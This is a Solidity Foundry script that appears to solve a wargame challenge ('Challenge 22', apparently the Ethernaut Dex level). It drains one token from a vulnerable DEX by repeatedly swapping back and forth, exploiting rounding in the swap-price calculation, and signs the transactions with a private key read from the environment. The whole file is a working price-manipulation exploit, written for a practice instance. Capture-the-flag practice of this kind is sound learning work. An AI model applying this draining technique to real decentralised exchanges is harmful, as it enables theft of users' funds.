// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

/**
 * @title Challenge 22 Solution Script
 * @notice Drain one token from the DEX by exploiting the price calculation rounding
 */
contract DexSolution is Script {
    address constant INSTANCE = 0x9603A51F6A924d9A93d6a81FEB72a85C16964812;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(deployerPrivateKey);

        IDex dex = IDex(INSTANCE);
        address token1 = dex.token1();
        address token2 = dex.token2();

        vm.startBroadcast(deployerPrivateKey);

        // Approve the DEX to spend our tokens
        dex.approve(INSTANCE, type(uint256).max);

        // Swap back and forth to exploit rounding errors in getSwapPrice
        // Each swap gives us slightly more due to integer division rounding
        // Start: player has 10 of each, dex has 100 of each

        // Swap 1: 10 token1 -> token2
        dex.swap(token1, token2, 10);
        // Swap 2: 20 token2 -> token1
        dex.swap(token2, token1, 20);
        // Swap 3: 24 token1 -> token2
        dex.swap(token1, token2, dex.balanceOf(token1, player));
        // Swap 4: 30 token2 -> token1
        dex.swap(token2, token1, dex.balanceOf(token2, player));
        // Swap 5: 41 token1 -> token2
        dex.swap(token1, token2, dex.balanceOf(token1, player));
        // Swap 6: Swap exactly enough to drain one token
        // At this point, we need to calculate the exact amount
        uint256 token2Balance = dex.balanceOf(token2, player);
        uint256 dexToken1Balance = dex.balanceOf(token1, INSTANCE);
        uint256 dexToken2Balance = dex.balanceOf(token2, INSTANCE);

        // amount out = amount_in * dexToken1Balance / dexToken2Balance
        // We want amount out = dexToken1Balance (drain all)
        // So amount_in = dexToken2Balance
        if (token2Balance >= dexToken2Balance) {
            dex.swap(token2, token1, dexToken2Balance);
        } else {
            dex.swap(token2, token1, token2Balance);
        }

        vm.stopBroadcast();

        console.log("Dex token1 balance:", dex.balanceOf(token1, INSTANCE));
        console.log("Dex token2 balance:", dex.balanceOf(token2, INSTANCE));
        console.log("Challenge 22 completed!");
    }
}
